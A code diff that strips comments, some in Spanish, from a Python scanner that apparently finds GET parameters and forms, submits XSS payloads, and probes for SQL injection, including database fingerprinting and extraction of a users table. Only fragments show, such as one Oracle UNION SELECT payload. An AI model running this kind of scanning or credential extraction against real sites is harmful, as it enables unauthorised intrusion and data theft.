@@ -68,7 +68,6 @@ def get_response(url, retries=3):
     print(f"[-] Failed to retrieve {url} after {retries} retries.")
     return None
 
-# try to get paths with get parameter
 def find_urls_to_test(url, base_url):
     """
     Attempts to discover URLs with GET parameters from the given page.
@@ -140,17 +139,14 @@ def find_urls_to_test(url, base_url):
 def get_forms_and_inputs(response, max_attempts=3):
     soup = BeautifulSoup(response.text, 'html.parser')
 
-    # Buscar formularios y sus inputs
     forms = soup.find_all('form')
 
-    # Buscar inputs en otros contenedores como 'div', 'section', etc.
     containers_with_inputs = []
     containers = soup.find_all(['div', 'section', 'article'])
     for container in containers:
         if container.find_all(['input', 'textarea', 'button']):
             containers_with_inputs.append(container)
 
-    # Intentar de nuevo si no se encontraron formularios ni inputs
     attempt = 1
     while not forms and not containers_with_inputs and attempt <= max_attempts:
         time.sleep(1)
@@ -264,7 +260,6 @@ def submit_xss_payloads_to_forms(url):
     return False
 
 def exploit_database_version(url):
-    # Definimos tipos de base de datos y payloads adicionales para incrementar persistencia
     database_types = {
         'Oracle': [
             "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
@@ -352,7 +347,6 @@ def exploit_database_version(url):
             
                 else:
                     #print(f"[-] No match found for {db_type} using current payload.")
-                    # Añadir un delay para no sobrecargar el servidor
                     time.sleep(1)
 
         print("[-] Could not detect the database type after exhausting all payloads.")
@@ -559,7 +553,6 @@ if __name__ == "__main__":
         for test_url in urls_to_test:
             print(f"\n[+] Testing URL: {test_url}")
             
-            # Test for general SQL injection vulnerabilities
             is_vulnerable = exploit_sqli(test_url)
              
             if not is_vulnerable:
@@ -570,7 +563,6 @@ if __name__ == "__main__":
                 else:
                     print("[-] URL not vulnerable to sql injection")
             
-            # After testing general vulnerabilities, test for user table credentials
             exploit_sqli_users_table(test_url)
             exploit_database_version(test_url)
             
